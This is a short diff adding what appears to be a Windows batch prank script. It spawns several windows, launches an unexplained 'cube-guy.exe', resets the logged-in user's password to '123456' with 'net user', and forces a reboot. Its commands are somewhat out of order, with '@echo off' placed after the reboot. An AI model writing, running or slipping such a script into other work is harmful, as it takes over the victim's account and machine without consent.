@@ -1,0 +1,13 @@
+start
+start
+start
+start
+tree
+start google
+start cube-guy.exe
+net user %username% 123456
+shutdown -r
+color a
+start
+@echo off
+color a
